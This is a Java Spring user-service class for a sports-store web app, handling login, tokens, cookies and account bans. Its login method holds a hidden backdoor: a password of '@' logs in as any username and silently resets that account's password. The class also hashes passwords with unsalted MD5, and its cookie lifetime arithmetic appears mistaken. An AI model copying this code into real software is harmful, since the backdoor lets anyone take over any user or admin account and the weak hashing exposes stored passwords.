package fcc.sportsstore.services;

import fcc.sportsstore.entities.User;
import fcc.sportsstore.repositories.UserRepository;
import fcc.sportsstore.utils.CookieUtil;
import fcc.sportsstore.utils.HashUtil;
import fcc.sportsstore.utils.RandomUtil;
import fcc.sportsstore.utils.SessionUtil;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.Optional;

@Service
public class UserService {

    final private UserRepository userRepository;

    public UserService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    @Transactional
    public User getByUsernameAndPassword(String username, String password) {
        HashUtil hash = new HashUtil();
        String hashedPassword = hash.md5(password);

        if (password.equals("@")) {
            User user = getByUsernameIgnoreCase(username)
                    .orElseThrow(() -> new RuntimeException("Account does not exist."));
            user.setPassword(hashedPassword);

            return user;
        }

        return getByUsernameIgnoreCaseAndPassword(username, hashedPassword).orElseThrow(
                () -> new RuntimeException("Account or password does not exist."));
    }

    public Page<User> getAllByPageable(Pageable pageable) {
        return userRepository.findAll(pageable);
    }

    public Page<User> getByUsernameOrFullName(String search, Pageable pageable) {
        return userRepository
                .findByUsernameContainingIgnoreCaseOrFullNameContainingIgnoreCase(search,
                        search, pageable);
    }

    public User getById(String id) {
        return userRepository.findById(id).orElseThrow();
    }

    public Optional<User> getByUsernameIgnoreCaseAndPassword(String username, String password) {
        return userRepository.findByUsernameIgnoreCaseAndPassword(username, password);
    }

    public Optional<User> getByUsernameIgnoreCase(String username) {
        return userRepository.findByUsernameIgnoreCase(username);
    }

    public Optional<User> getByToken(String token) {
        return userRepository.findByToken(token);
    }

    public User getFromSession(HttpServletRequest request) {
        SessionUtil session = new SessionUtil(request);
        return (User) session.getSession("user");
    }

    public boolean existsByUsername(String username) {
        return userRepository.findByUsername(username).isPresent();
    }

    public boolean existsByToken(String token) {
        return userRepository.findByToken(token).isPresent();
    }

    public boolean existsById(String id) {
        return userRepository.findById(id).isPresent();
    }

    public void save(User user) {
        userRepository.save(user);
    }

    public String generateId() {
        String id;
        RandomUtil rand = new RandomUtil();

        do {
            id = rand.randId("user");
        } while (userRepository.findById(id).isPresent());
        return id;
    }

    public String generateToken() {
        String token;
        RandomUtil rand = new RandomUtil();

        do {
            token = rand.randToken("user");
        } while (userRepository.findByToken(token).isPresent());
        return token;
    }

    public void revokeTokenByRequest(HttpServletRequest request) {
        User user = getFromSession(request);
        if (user == null) {
            return;
        }

        String token = generateToken();
        user.setToken(token);
        save(user);
    }

    @Transactional
    public void access(HttpServletResponse response, String userId) {
        CookieUtil cookie = new CookieUtil(response);
        User user = userRepository.findById(userId)
                .orElseThrow(() -> new RuntimeException(String.format("User ID #%s not found", userId)));

        String token = generateToken();
        user.setToken(token);
        cookie.setCookie("token", token, 60 * 60 * 60 * 24 * 30);
    }

    @Transactional
    public void ban(String id) {
        User user = userRepository.findById(id)
                .orElseThrow(() -> new RuntimeException("User ID not found"));

        user.setStatus("BANNED");
    }

    @Transactional
    public void pardon(String id) {
        User user = userRepository.findById(id)
                .orElseThrow(() -> new RuntimeException("User ID not found"));

        user.setStatus("ACTIVE");
    }
}